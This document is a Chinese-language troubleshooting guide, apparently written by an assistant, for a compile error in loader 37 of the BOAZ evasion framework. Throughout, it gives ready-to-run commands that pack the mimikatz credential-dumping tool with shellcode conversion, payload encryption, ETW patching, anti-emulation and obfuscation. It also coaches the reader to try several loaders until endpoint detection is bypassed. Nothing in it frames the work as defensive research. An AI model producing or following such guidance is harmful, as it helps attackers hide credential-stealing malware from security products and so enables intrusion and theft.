# BOAZ 编译错误修复指南

## 问题描述

在使用 loader 37 时遇到编译错误：

```
error: multiple definition of 'enum _QUEUE_USER_APC_FLAGS'
error: conflicting declaration 'typedef int QUEUE_USER_APC_FLAGS'
```

## 原因分析

1. **枚举重复定义**：loader37.c 中定义的 `QUEUE_USER_APC_FLAGS` 枚举与 Windows 系统头文件 (`processthreadsapi.h`) 中的定义冲突
2. **包含顺序问题**：头文件包含顺序导致依赖关系混乱

## 解决方案

### 方案1：使用其他兼容的Loader

最简单的解决方案是使用其他没有编译冲突的loader：

```bash
# 使用 loader 51 (类似功能，但无编译冲突)
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_51.exe -t donut -l 51 -e uuid -a -u -etw

# 使用 loader 48
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_48.exe -t donut -l 48 -e uuid -a -u -etw

# 使用 loader 65 (VMT hooking)
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_65.exe -t donut -l 65 -e uuid -a -u -etw
```

### 方案2：手动修复编译错误

如果确实需要使用 loader 37，需要修改源代码：

#### 修复步骤：

1. **修改 loaders/loader37_modified.c**：
   - 注释掉或删除重复的枚举定义（第940-944行）
   - 调整头文件包含顺序

2. **推荐的修改**：

```c
// 在 loader37_modified.c 中：
// 注释掉或删除以下代码块：
/*
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;
*/
```

3. **调整包含顺序**：
```c
// 确保 windows.h 在最前面
#include <windows.h>
#include <winternl.h>
#include <psapi.h>

// 然后再包含其他头文件
#include "etw_pass.h"
#include "anti_emu.h"
#include "api_untangle.h"
#include "uuid_converter.h"
```

### 方案3：使用Docker修复版本

如果你在Docker环境中，可以创建一个修复脚本：

```bash
# 创建修复脚本
cat > fix_loader37.sh << 'EOF'
#!/bin/bash
# 修复 loader 37 编译错误

LOADER_FILE="loaders/loader37_modified.c"

# 备份原文件
cp $LOADER_FILE ${LOADER_FILE}.bak

# 注释掉冲突的枚举定义
sed -i '940,944s/^/\/\//g' $LOADER_FILE

echo "Loader 37 修复完成"
EOF

chmod +x fix_loader37.sh
./fix_loader37.sh
```

## 推荐的替代Loader

基于你的绕过需求，以下loader具有类似功能且无编译问题：

### 高级内存保护Loader：
- **Loader 51**: Sifu断点处理，内存保护 + RC4加密
- **Loader 48**: Sifu断点处理（NtResumeThread钩子）
- **Loader 65**: 高级VMT hooking + 自定义模块加载器

### 测试这些Loader：

```bash
# Loader 51 - 推荐替代方案
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_51.exe \
  -t donut -l 51 -e uuid -a -u -etw -obf

# Loader 48 - 另一个选择
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_48.exe \
  -t donut -l 48 -e aes -a -u -g -etw

# Loader 65 - VMT hooking
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_65.exe \
  -t amber -l 65 -e chacha -a -u -g -obf
```

## 最佳实践建议

1. **优先使用无冲突的loader**：避免手动修改源代码
2. **测试多个loader**：不同的EDR对不同技术的检测能力不同
3. **渐进式测试**：
   ```bash
   # 先测试基础配置
   python3 Boaz.py -f /Virus/mimikatz_raw.exe -o test1.exe -t donut -l 51 -e uuid

   # 再添加完整混淆
   python3 Boaz.py -f /Virus/mimikatz_raw.exe -o test2.exe -t donut -l 51 -e uuid \
     -a -u -etw -obf -entropy 2
   ```

## 修复验证

修复完成后，验证编译是否成功：

```bash
# 测试编译
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/test.exe -t donut -l 37 -e uuid

# 检查输出文件
ls -la /boaz/output/
```

如果编译成功，再使用完整的混淆参数。

## 总结

- **立即可用的解决方案**：使用 loader 51、48 或 65 替代 loader 37
- **长期解决方案**：修复 loader 37 的源代码冲突
- **推荐策略**：先测试简单的loader，确认绕过效果后再增加复杂度